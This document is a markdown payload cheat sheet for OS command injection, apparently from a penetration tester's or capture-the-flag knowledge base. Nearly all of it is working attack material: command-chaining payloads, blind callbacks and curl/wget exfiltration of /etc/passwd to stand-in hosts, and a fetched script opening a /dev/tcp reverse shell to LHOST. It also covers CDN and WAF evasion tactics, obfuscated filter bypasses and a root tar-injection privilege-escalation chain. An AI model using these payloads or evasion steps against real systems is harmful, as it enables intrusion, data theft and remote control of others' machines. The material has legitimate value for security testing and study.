---
title: "Payloads: OS Command Injection"
type: payloads
tags: [payloads, command-injection, rce, web]
sources: [hacktricks-linux]
date_created: 2026-06-16
date_updated: 2026-06-30
---

# Payloads: OS Command Injection

Reusable command-injection probes + filter bypasses. Blind variants need OOB (Collaborator/interactsh) - channel setup in [[oob-callbacks]]. See [[os-command-injection]].

## Separators / chaining
```
; id            | id            || id           && id
`id`            $(id)           %0aid          %0a id
\nid            {id,}           <(id)
```

## OOB confirm (blind)
```
; curl http://<id>.oob.example/`whoami`
| nslookup <id>.oob.example
& ping -c1 <id>.oob.example
$(curl http://<id>.oob.example)
```

### CDN/WAF in front: pick the verb and the callback domain deliberately

A managed CDN ruleset (Cloudflare's is the one seen in the wild) blocks blind-cmdi probes
on **two independent axes**, and both silently kill every stock scanner template - the
payload dies at the edge and never reaches the origin, so a clean run is **not** evidence
of absence. Fingerprint both before running anything, against one endpoint with a known
`200` baseline, one probe at a time:

| axis | typically BLOCKED (403) | typically PASSES |
|---|---|---|
| DNS verb + argument | `nslookup <x>`, `curl <x>`, `wget <x>`, `whoami` | `host <x>`, `dig <x>`, `ping -c1 <x>` |
| space bypass | `${IFS}` / `$IFS$9` | a literal space |
| callback domain | `oastify.com`, `interact.sh`, `burpcollaborator.net` | `oast.fun` / `oast.me` / `oast.pro` / `oast.site`, `canarytokens.com`, `requestrepo.com`, `webhook.site`, `dnslog.cn`, own domain |
| separators | (usually none) | `;` `\|` `&` `$()` `` ` `` `%0a` |

Consequences worth internalising:

- **Burp Collaborator can be unusable** on such a target - `oastify.com` is blocklisted by
  name, with or without a command around it. Switch to interactsh (`.oast.fun`), whose
  domains commonly pass. Test the bare domain alone to separate the two rules.
- **Stock nuclei OOB templates are neutered.** `dast/vulnerabilities/cmdi/blind-oast-polyglots.yaml`
  and most `-tags oast` cmdi payloads are built from `nslookup` / `wget` / `${IFS}`. Clone the
  template and swap in `host` / `dig` / `ping -c1` with literal spaces. Non-cmdi OOB checks
  (JNDI/`${jndi:ldap://}`, XXE entities) are unaffected.
- **Query string and POST body are filtered by DIFFERENT rules.** A body that 403s on
  `;host <x>` may pass `$(host <x>)`. Always retest the shape per part.
- A `419` / `422` / `400` is the *app's* CSRF or validation layer, not the sink: the field
  was never used. Prime the form page, carry its cookies + `_token` / `authenticity_token` /
  `YII_CSRF_TOKEN`, then re-probe, or the whole POST run measures nothing.

Always prove the channel before trusting a negative: resolve `poscontrol.<your-id>` from
your own box and confirm the listener logs it. See [[oob-callbacks]].

## Time-based (blind, no OOB)
```
; sleep 10
&& ping -c 10 127.0.0.1
$(sleep 10)
| timeout 10 cat
```

## Space / filter bypass
```
cat${IFS}/etc/passwd        cat$IFS$9/etc/passwd
{cat,/etc/passwd}           cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
echo${IFS}aWQK|base64${IFS}-d|sh        # base64-wrapped: id
```

## Validated host/IP field (ping / health / traceroute / nslookup)
A "host health check / ping / diagnostic" feature validates the input as a hostname/IP, usually
**per newline-separated line** against `^[A-Za-z0-9.-]+$`. A literal **newline (`%0a`)** bypasses an
`^`-anchored / per-line check and starts a new command (`os.system("ping -c2 "+target)`).
**Probe the charset first** - send `127.0.0.1%0aX` per metachar, watch for "Invalid":
```
127.0.0.1%0aid              # bare alnum command passes the hostname regex -> runs
# typical result: space, TAB, / , : are ALLOWED ; $ { } ; | & ( ) are BLOCKED
```
- If `$ { }` are blocked, **`${IFS}`, `$IFS$9`, `$()` are all dead** - but spaces are usually
  allowed, so just use a literal space. Do NOT reflexively reach for `${IFS}`.
- Each line is re-validated, so `;` `|` `&` chaining fails -> separate commands with more newlines.
- **Reverse shell when `; | & $ { } < >` are blocked but space/slash/colon pass**: put every
  metachar INSIDE a fetched script; the injection only needs `curl`+`bash`:
```
127.0.0.1
curl http://LHOST:8000/s -o /tmp/s
bash /tmp/s
# host  s = 'bash -i >& /dev/tcp/LHOST/PORT 0>&1'  on your box; pick an EGRESS-ALLOWED port
# (reflected-output sinks need no shell at all - cat /etc/passwd etc. run inline)
```

## Char/keyword bypass (WAF, blocklist)
```
c''at /et''c/pas''swd        c\at /et\c/pas\swd
/???/??t /???/p??s??         w'h'o'a'm'i
$(printf '\151\144')          # octal -> id
$(rev<<<'di')                 # reversed
a=c;b=at;$a$b /etc/passwd
```

## Allowlist / prefix-match bypass
App permits only one fixed command but checks it weakly (`strpos($cmd,'date')===0`, `startswith`,
a prefix `in_array`). Chain your command off the allowed prefix:
```
date;id            date && id          date | id          date `id`          date $(id)
ping -c1 127.0.0.1;cat /flag           # any allowed word as the prefix, then ; && | etc
```

## Exfil (read output without echo)
```
; curl -X POST --data-binary @/etc/passwd http://<id>.oob.example
; wget --post-file=/etc/passwd http://<id>.oob.example
; cat /flag | base64 | curl http://<id>.oob.example/$(cat -)
```

## Windows
```
& whoami      | whoami     && whoami
%0a whoami    & powershell -enc <b64>
& nslookup <id>.oob.example
```

## Argument/PATH injection
```
file -- -oG /tmp/x          # option injection
LD_PRELOAD / wildcard: tar cf x * -> --checkpoint-action=exec
```

## Advanced filter bypass: builtins-only, char reconstruction, 5-char RCE
When `PATH` is stripped or external binaries are blocked, fall back to shell builtins and reconstruct
characters instead of typing forbidden ones.
```bash
compgen -b                                    # list builtins
PATH=$(echo /usr/bin); echo $PATH             # or: declare -x PATH=/bin
printf %s "${PATH:0:1}"                        # extract "/" from an env var without typing it
$(printf '\x63\x61\x74') /etc/passwd          # reconstruct "cat" via octal/hex printf
```
Word/path filters: split binary names so blocklists miss them, using shell features the parser
resolves before exec: quotes/backslashes inside the name (`c""at`, `w\ho\am\i`), wildcard/`?`
substitution against `/bin`, `$@`/`$0`, uninitialized-variable insertion (`cat$u /etc/passwd`),
case/reverse/base64 transforms, and history-expansion string building. Double-base64 a reverse shell
to dodge bad chars entirely:
```bash
echo${IFS}<b64b64>|ba''se''64${IFS}-''d|base64${IFS}-d|bash
```
When only a handful of characters pass a regex, the Orange Tsai BabyFirst 5-char RCE bootstraps: use
`ls -t>g` filename-ordering tricks to assemble longer commands into a file, then execute it,
escalating a tiny character set into full command execution. Also test newline injection against
regexes that only match `[a-zA-Z0-9]` on a single line. Bashfuscator can generate obfuscated
equivalents when hand-crafting stalls.

## Internal root job/export microservice: report/filename param -> tar command injection

A recurring privesc chain on multi-tier web boxes: a loopback-only microservice (an "automation",
"export", "backup", or "report" runner, often Flask/gunicorn) runs as **root** and exposes a
Bearer-gated job endpoint such as `POST /jobs/export` with body `{"report":"<name>"}`. That
name/report/filename value is frequently concatenated into a shell archive command via `shell=True`:

```
tar czf /var/<svc>/exports/<report>.tgz /var/<svc>/data 2>&1
```

so a `report` value of `x;<cmd>;#` injects `<cmd>` as root. Confirm root, then read the flag:

```
{"report":"x;id;cat /root/root.txt;#"}   # output field -> uid=0(root) + flag
```

Notes:
- The service's `GET /health` usually self-documents the route, the auth header, and `runs_as: root`.
- The Bearer key lives in a root-only env file; do not grind to read it directly, it is typically
  leaked by a peer service or admin panel that also holds it (e.g. a UCP dashboard widget, see
  [[cms-exploitation]]).
- Drive the request from the foothold user against `127.0.0.1:<port>` directly through the foothold
  RCE, a meterpreter port-forward to the loopback service is often flakier than hitting it in-place.

<!-- promoted-slug: internal-root-jobservice-tar-injection -->
